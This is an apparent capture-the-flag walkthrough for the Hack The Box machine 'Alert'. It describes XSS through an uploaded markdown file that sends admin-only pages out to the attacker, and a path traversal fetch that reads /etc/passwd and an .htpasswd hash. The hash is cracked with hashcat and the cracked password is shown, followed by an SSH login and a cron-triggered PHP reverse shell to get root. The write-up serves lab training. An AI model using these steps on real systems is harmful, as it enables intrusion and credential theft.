## Alert

1. The first page allows md file upload and creates a link to share.
2. the contact us page allows links to be posted and the admin interacts with these links
3. From gobuster we know there is a messages dir (forbidden)
4. Try to add .php extension to these dirs found, we can see there is a .messages.php page (not accessible to us)
5. Create a JS script to fetch the messages.php page and send the output to our machine via a GET or POST request.
6. Refer to the example.md script and try to access passwd/shadow files

    `fetch('http://alert.htb/messages.php?file=../../../..//etc/passwd')`
    ```
    root:x:0:0:root:/root:/bin/bash
    albert:x:1000:1000:albert:/home/albert:/bin/bash
    david:x:1001:1002:,,,:/home/david:/bin/bash
    ```

7. We know there is an Apache 2.4.x server being used. Try to access the configuration files

    `etc/apache2/sites-available/000-default.conf`
    ```
    <pre><VirtualHost *:80>
        ServerName alert.htb

        DocumentRoot /var/www/alert.htb

        <Directory /var/www/alert.htb>
            Options FollowSymLinks MultiViews
            AllowOverride All
        </Directory>

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^alert\.htb$
        RewriteCond %{HTTP_HOST} !^$
        RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>

    <VirtualHost *:80>
        ServerName statistics.alert.htb

        DocumentRoot /var/www/statistics.alert.htb

        <Directory /var/www/statistics.alert.htb>
            Options FollowSymLinks MultiViews
            AllowOverride All
        </Directory>

        <Directory /var/www/statistics.alert.htb>
            Options Indexes FollowSymLinks MultiViews
            AllowOverride All
            AuthType Basic
            AuthName "Restricted Area"
            AuthUserFile /var/www/statistics.alert.htb/.htpasswd
            Require valid-user
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
    </VirtualHost>

    </pre>
    ```
8. Access the .htpasswd file mentioned in the vhosts file

    `/var/www/statistics.alert.htb/.htpasswd`

    ```
    albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
    ```

9. cracked with: `hashcat -m 1600 -a 0 hash.txt --wordlist=rockyou.txt` -> `manchesterunited`

10. `ssh albert@10.10.11.44 with password above`

<hr>

11. `chrome-sandbox` to read the root contents seems interesting but did not work

12. `netstat -tunlp | grep LISTEN` : try the 8080 port

13. Transfer `linpeas.sh` and run it.
    read the cron jobs.
    we can see a script is being run as root when the configuration file in website-monitor is modified.
    
14. Run a nc server to our machine.
    Replace the configuration file with a php reverse shell.
    The configuration file will run and then be replaced with the original configuration required.
    This will get us the root on our nc server.
